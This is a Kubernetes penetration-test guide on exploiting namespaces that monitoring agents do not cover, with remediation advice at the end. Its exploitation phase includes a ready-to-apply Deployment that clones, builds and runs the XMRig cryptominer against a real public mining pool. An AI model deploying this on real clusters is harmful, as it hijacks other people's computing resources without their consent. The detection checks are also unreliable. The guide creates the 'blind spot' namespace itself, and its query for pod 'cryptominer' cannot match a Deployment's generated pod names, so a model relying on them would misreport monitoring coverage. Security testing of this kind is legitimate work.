# Kubernetes Penetration Test: Monitoring Agent Blind Spot Exploitation

## 1. Overview

This document outlines the process for identifying and exploiting a vulnerability related to monitoring agent blind spots in a Kubernetes cluster. This vulnerability arises when monitoring agents, responsible for collecting metrics and logs, are not configured to monitor all critical components or namespaces within the cluster. This creates a blind spot that an attacker can exploit to perform malicious activities undetected.

**Attack Vector Description:**

An attacker gains initial access to the Kubernetes cluster, typically through a compromised pod or application.  The attacker then identifies namespaces or resources not adequately monitored by the monitoring agent. They subsequently deploy malicious workloads or execute commands within these blind spots, knowing that their activities are less likely to trigger alerts or investigations.

**Potential Impact and Consequences:**

*   **Data Exfiltration:** Exfiltrate sensitive data from the cluster without detection.
*   **Cryptojacking:** Deploy cryptocurrency miners within the unmonitored areas, consuming resources without raising alarms.
*   **Lateral Movement:** Use the unmonitored environment as a staging ground for further lateral movement within the cluster.
*   **Denial of Service (DoS):** Launch DoS attacks on other services within the cluster without detection.
*   **Compromise of control plane components:**  If the blind spot includes monitoring the API server's audit logs, attacker actions targeting the control plane will remain hidden.

**Risk Level Assessment:**

**High** (If critical namespaces or the control plane are not monitored) - The potential impact allows for significant and persistent compromise of the cluster without timely detection.

**Medium** (If only non-critical namespaces are affected) - Limited impact, but still allows for resource abuse and potentially data leakage from these specific namespaces.

**Technical Explanation:**

Most Kubernetes monitoring solutions rely on agents deployed within the cluster to collect metrics, logs, and events.  These agents typically use configurations that specify which namespaces, pods, or resource types they are supposed to monitor.  If the configuration is incomplete or outdated, it can leave certain areas of the cluster unmonitored. This can happen due to:

*   **Configuration errors:** Incorrectly configured `kubelet` arguments preventing log forwarding or metrics scraping.
*   **Insufficient RBAC permissions:** Monitoring agents lacking the necessary RBAC permissions to access resources in specific namespaces.
*   **Dynamic namespaces:** Newly created namespaces after the initial monitoring agent deployment may not be automatically included in the monitoring scope.
*   **Incorrect pod annotations:** Monitoring agents rely on pod annotations to determine whether a pod must be monitored. Lack of annotation for monitoring on crucial pods will lead to an undetected state.

**Prerequisites and Conditions Needed:**

*   Attacker has initial access to the Kubernetes cluster (e.g., via a compromised pod, service account token, or exposed API endpoint).
*   Knowledge of the deployed monitoring solution (e.g., Prometheus, Datadog, Splunk) and its configuration.
*   Ability to deploy pods and execute commands within the cluster.
*   Tools like `kubectl`, `curl`, `nmap`, and general penetration testing utilities.

## 2. Validation and Exploitation Steps

**Phase 1: Identifying Monitoring Blind Spots**

This phase involves determining which namespaces or resources are not being adequately monitored.  We will use a combination of techniques to identify potential blind spots.

**Step 1: List all Namespaces in the Cluster**

```bash
kubectl get namespaces
```

*   **Explanation:** This command lists all namespaces within the Kubernetes cluster. We will use this list to identify namespaces that might be outside the scope of monitoring.
*   **Expected Output:** A list of namespaces, including `default`, `kube-system`, `kube-public`, and potentially other custom namespaces.
*   **Why:** Knowing all namespaces is crucial for identifying those potentially overlooked by the monitoring agent.

**Step 2: Identify Known Monitored Namespaces (Example using Prometheus)**

We will use the Prometheus query language (PromQL) to query the Prometheus server for the namespaces it's monitoring. This assumes Prometheus is being used as a monitoring solution. Adapt this step based on your monitoring system. This step is only an example and might not work with all monitoring solutions.

```bash
kubectl port-forward -n monitoring service/prometheus-k8s 9090:9090 &
curl "http://localhost:9090/api/v1/query?query=kube_namespace_labels"
```

*   **Explanation:**
    *   `kubectl port-forward` forwards port 9090 from the `prometheus-k8s` service in the `monitoring` namespace to localhost:9090, allowing us to access the Prometheus API.
    *   `curl` queries the Prometheus API with the PromQL query `kube_namespace_labels`. This query returns the labels for each namespace being monitored by Prometheus.
*   **Expected Output:** A JSON response containing metrics related to namespaces, including the `namespace` label.  The values of the `namespace` label indicate the namespaces being monitored.
*   **Why:** This reveals which namespaces Prometheus is actively monitoring.
*   **Variations:** If using Grafana, inspect the dashboards to identify which namespaces are being visualized.  If using Datadog or Splunk, query their respective APIs for similar information. Replace `kube_namespace_labels` with query suitable for your monitoring solution.

**Step 3: Compare and Identify Potential Blind Spots**

Compare the list of all namespaces (from Step 1) with the list of monitored namespaces (from Step 2). Any namespaces present in the first list but absent from the second list are potential blind spots.  Let's say, for example, there is a namespace called `unmonitored-namespace` that isn't listed in the Prometheus output.

*   **Explanation:** This identifies namespaces where the monitoring agent is potentially not collecting metrics and logs.
*   **Why:**  This focuses our attention on areas where we can potentially operate undetected.

**Step 4: Verify Lack of Monitoring (Deploy a Pod in the Target Namespace)**

Deploy a simple pod in the potential blind spot namespace (`unmonitored-namespace` in our example) and verify that its logs and metrics are not being collected by the monitoring agent.

First create the `unmonitored-namespace`:

```bash
kubectl create namespace unmonitored-namespace
```

Then, deploy a simple nginx pod in the namespace:

```bash
kubectl run nginx-test --image=nginx -n unmonitored-namespace
```

Now check if Prometheus is collecting metrics about the pod:

```bash
curl "http://localhost:9090/api/v1/query?query=kube_pod_container_resource_limits{namespace='unmonitored-namespace'}"
```

*   **Explanation:** We deploy a simple pod to generate activity and then query the monitoring system to see if it's being monitored.
*   **Expected Output:** If the namespace is genuinely a blind spot, the Prometheus query should return no results. A `data: { resultType: "vector", result: [] }` response indicates that no metrics are being collected for pods in that namespace.
*   **Why:** This provides definitive proof that the namespace is not being monitored.

**Phase 2: Exploiting the Monitoring Blind Spot**

Now that we have identified a monitoring blind spot, we can exploit it to perform malicious activities without raising alarms.

**Step 5: Deploy a Malicious Pod (Cryptominer)**

Deploy a cryptocurrency miner pod in the `unmonitored-namespace`. This demonstrates resource abuse that would likely be detected if the namespace were being monitored.

```bash
kubectl apply -f - <<EOF
apiVersion: apps/v1
kind: Deployment
metadata:
  name: cryptominer
  namespace: unmonitored-namespace
spec:
  replicas: 1
  selector:
    matchLabels:
      app: cryptominer
  template:
    metadata:
      labels:
        app: cryptominer
    spec:
      containers:
      - name: cryptominer
        image: alpine/git
        command: ["/bin/sh"]
        args: ["-c", "git clone https://github.com/xmrig/xmrig.git && cd xmrig && mkdir build && cd build && cmake .. && make -j$(nproc) && ./xmrig --donate-level 1 -o pool.supportxmr.com:3333 -u YOUR_WALLET_ADDRESS -p x "]
        resources:
          requests:
            cpu: "1"
            memory: "1Gi"
          limits:
            cpu: "2"
            memory: "2Gi"
EOF
```

*   **Explanation:** This deploys a cryptominer pod that will consume CPU and memory resources. Replace `YOUR_WALLET_ADDRESS` with a valid wallet address. This command clones the XMRig repository, builds the miner, and runs it against a mining pool.
*   **Expected Output:** The cryptominer pod will be deployed and start consuming significant CPU resources.
*   **Why:**  Demonstrates that an attacker can deploy resource-intensive workloads without triggering alerts.

**Step 6: Validate Undetected Resource Consumption**

Verify that the resource consumption of the cryptominer pod is not visible in the monitoring system. Re-run the Prometheus query from Step 4, but this time, search for resource metrics specifically:

```bash
curl "http://localhost:9090/api/v1/query?query=kube_pod_container_resource_requests{namespace='unmonitored-namespace',pod='cryptominer'}"
```

*   **Explanation:** Queries Prometheus for resource requests related to the `cryptominer` pod in the `unmonitored-namespace`.
*   **Expected Output:**  Should return `data: { resultType: "vector", result: [] }`, confirming that the resource usage of the cryptominer is not being monitored.
*   **Why:** This reinforces that the monitoring agent is blind to the malicious activity.

**Step 7: (Optional) Data Exfiltration**

As a further demonstration, you could deploy a pod that exfiltrates data from the cluster to an external destination. This could involve reading secrets, database credentials, or other sensitive information and sending it to a server controlled by the attacker. Due to the sensitivity of this step, details are intentionally omitted.

**Remediation Recommendations:**

*   **Comprehensive Configuration:**  Ensure the monitoring agent is configured to monitor *all* critical namespaces, pods, and resource types within the cluster.  This includes any newly created namespaces or resources.
*   **RBAC Review:** Verify that the monitoring agent has the necessary RBAC permissions to access resources in all namespaces.
*   **Dynamic Discovery:** Implement dynamic discovery mechanisms to automatically include new namespaces and resources in the monitoring scope.  Consider using operators or dynamic configuration updates.
*   **Centralized Logging:** Configure centralized logging for all components of the cluster, including the API server, kubelet, and container runtime. Enable audit logging for the API server.
*   **Alerting and Anomaly Detection:**  Configure alerts based on resource utilization, network traffic, and other suspicious activities.  Implement anomaly detection to identify deviations from normal behavior.
*   **Regular Audits:** Conduct regular audits of the monitoring configuration and the cluster's security posture.
*   **Pod Annotations:** Ensure all crucial pods contain necessary pod annotations so they are discovered by the monitoring agent.
*   **Immutable Infrastructure:** Implement immutable infrastructure principles to prevent unauthorized modifications to the monitoring configuration.
*   **Update Monitoring Software:** Ensure your monitoring software is always up to date with the latest security patches.

This detailed documentation provides a comprehensive guide for understanding and reproducing the monitoring agent blind spot vulnerability in Kubernetes.  By following these steps, penetration testers can effectively assess the risk and potential impact of this vulnerability and provide actionable remediation recommendations to improve the cluster's security posture.
